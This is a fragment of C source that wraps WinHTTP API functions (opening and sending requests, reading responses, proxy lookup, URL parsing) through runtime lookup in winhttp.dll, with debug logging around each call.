HINTERNET winapi_winhttp_WinHttpOpenRequest(HINTERNET hConnect, LPCWSTR pwszVerb, LPCWSTR pwszObjectName, LPCWSTR pwszVersion, LPCWSTR pwszReferrer, LPCWSTR* ppwszAcceptTypes, DWORD dwFlags) {
    HINTERNET (*pWinHttpOpenRequest)(HINTERNET hConnect, LPCWSTR pwszVerb, LPCWSTR pwszObjectName, LPCWSTR pwszVersion, LPCWSTR pwszReferrer, LPCWSTR* ppwszAcceptTypes, DWORD dwFlags) = GetFunction(WINHTTP_DLL, "WinHttpOpenRequest");
    dprintf("[WINAPI][winapi_winhttp_WinHttpOpenRequest] Calling WinHttpOpenRequest @ %p", pWinHttpOpenRequest);
    if (pWinHttpOpenRequest) {
        return pWinHttpOpenRequest(hConnect, pwszVerb, pwszObjectName, pwszVersion, pwszReferrer, ppwszAcceptTypes, dwFlags);
    }
    return NULL;
}

BOOL winapi_winhttp_WinHttpGetIEProxyConfigForCurrentUser(WINHTTP_CURRENT_USER_IE_PROXY_CONFIG* pProxyConfig) {
    BOOL (*pWinHttpGetIEProxyConfigForCurrentUser)(WINHTTP_CURRENT_USER_IE_PROXY_CONFIG* pProxyConfig) = GetFunction(WINHTTP_DLL, "WinHttpGetIEProxyConfigForCurrentUser");
    dprintf("[WINAPI][winapi_winhttp_WinHttpGetIEProxyConfigForCurrentUser] Calling WinHttpGetIEProxyConfigForCurrentUser @ %p", pWinHttpGetIEProxyConfigForCurrentUser);
    if (pWinHttpGetIEProxyConfigForCurrentUser) {
        return pWinHttpGetIEProxyConfigForCurrentUser(pProxyConfig);
    }
    return FALSE;
}

BOOL winapi_winhttp_WinHttpGetProxyForUrl(HINTERNET hSession, LPCWSTR lpcwszUrl, WINHTTP_AUTOPROXY_OPTIONS* pAutoProxyOptions, WINHTTP_PROXY_INFO* pProxyInfo) {
    BOOL (*pWinHttpGetProxyForUrl)(HINTERNET hSession, LPCWSTR lpcwszUrl, WINHTTP_AUTOPROXY_OPTIONS* pAutoProxyOptions, WINHTTP_PROXY_INFO* pProxyInfo) = GetFunction(WINHTTP_DLL, "WinHttpGetProxyForUrl");
    dprintf("[WINAPI][winapi_winhttp_WinHttpGetProxyForUrl] Calling WinHttpGetProxyForUrl @ %p", pWinHttpGetProxyForUrl);
    if (pWinHttpGetProxyForUrl) {
        return pWinHttpGetProxyForUrl(hSession, lpcwszUrl, pAutoProxyOptions, pProxyInfo);
    }
    return FALSE;
}

BOOL winapi_winhttp_WinHttpSetOption(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength) {
    BOOL (*pWinHttpSetOption)(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength) = GetFunction(WINHTTP_DLL, "WinHttpSetOption");
    dprintf("[WINAPI][winapi_winhttp_WinHttpSetOption] Calling WinHttpSetOption @ %p", pWinHttpSetOption);
    if (pWinHttpSetOption) {
        return pWinHttpSetOption(hInternet, dwOption, lpBuffer, dwBufferLength);
    }
    return FALSE;
}

BOOL winapi_winhttp_WinHttpSendRequest(HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength, DWORD dwTotalLength, DWORD_PTR dwContext) {
    BOOL (*pWinHttpSendRequest)(HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength, DWORD dwTotalLength, DWORD_PTR dwContext) = GetFunction(WINHTTP_DLL, "WinHttpSendRequest");
    dprintf("[WINAPI][winapi_winhttp_WinHttpSendRequest] Calling WinHttpSendRequest @ %p", pWinHttpSendRequest);
    if (pWinHttpSendRequest) {
        return pWinHttpSendRequest(hRequest, lpszHeaders, dwHeadersLength, lpOptional, dwOptionalLength, dwTotalLength, dwContext);
    }
    return FALSE;
}

BOOL winapi_winhttp_WinHttpReceiveResponse(HINTERNET hRequest, LPVOID lpReserved) {
    BOOL (*pWinHttpReceiveResponse)(HINTERNET hRequest, LPVOID lpReserved) = GetFunction(WINHTTP_DLL, "WinHttpReceiveResponse");
    dprintf("[WINAPI][winapi_winhttp_WinHttpReceiveResponse] Calling WinHttpReceiveResponse @ %p", pWinHttpReceiveResponse);
    if (pWinHttpReceiveResponse) {
        return pWinHttpReceiveResponse(hRequest, lpReserved);
    }
    return FALSE;
}

BOOL winapi_winhttp_WinHttpQueryHeaders(HINTERNET hRequest, DWORD dwInfoLevel, LPCWSTR pwszName, LPVOID lpvBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex) {
    BOOL (*pWinHttpQueryHeaders)(HINTERNET hRequest, DWORD dwInfoLevel, LPCWSTR pwszName, LPVOID lpvBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex) = GetFunction(WINHTTP_DLL, "WinHttpQueryHeaders");
    dprintf("[WINAPI][winapi_winhttp_WinHttpQueryHeaders] Calling WinHttpQueryHeaders @ %p", pWinHttpQueryHeaders);
    if (pWinHttpQueryHeaders) {
        return pWinHttpQueryHeaders(hRequest, dwInfoLevel, pwszName, lpvBuffer, lpdwBufferLength, lpdwIndex);
    }
    return FALSE;
}

BOOL winapi_winhttp_WinHttpReadData(HINTERNET hRequest, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead) {
    BOOL (*pWinHttpReadData)(HINTERNET hRequest, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead) = GetFunction(WINHTTP_DLL, "WinHttpReadData");
    dprintf("[WINAPI][winapi_winhttp_WinHttpReadData] Calling WinHttpReadData @ %p", pWinHttpReadData);
    if (pWinHttpReadData) {
        return pWinHttpReadData(hRequest, lpBuffer, dwNumberOfBytesToRead, lpdwNumberOfBytesRead);
    }
    return FALSE;
}

BOOL winapi_winhttp_WinHttpQueryOption(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, LPDWORD lpdwBufferLength) {
    BOOL (*pWinHttpQueryOption)(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, LPDWORD lpdwBufferLength) = GetFunction(WINHTTP_DLL, "WinHttpQueryOption");
    dprintf("[WINAPI][winapi_winhttp_WinHttpQueryOption] Calling WinHttpQueryOption @ %p", pWinHttpQueryOption);
    if (pWinHttpQueryOption) {
        return pWinHttpQueryOption(hInternet, dwOption, lpBuffer, lpdwBufferLength);
    }
    return FALSE;
}

BOOL winapi_winhttp_WinHttpCrackUrl(LPCWSTR pwszUrl, DWORD dwUrlLength, DWORD dwFlags, LPURL_COMPONENTS lpUrlComponents) {
    BOOL (*pWinHttpCrackUrl)(LPCWSTR pwszUrl, DWORD dwUrlLength, DWORD dwFlags, LPURL_COMPONENTS lpUrlComponents) = GetFunction(WINHTTP_DLL, "WinHttpCrackUrl");
    dprintf("[WINAPI][winapi_winhttp_WinHttpCrackUrl] Calling WinHttpCrackUrl @ %p", pWinHttpCrackUrl);
    if (pWinHttpCrackUrl) {
        return pWinHttpCrackUrl(pwszUrl, dwUrlLength, dwFlags, lpUrlComponents);
    }
    return FALSE;
}

// END: winhttp.dll
#endif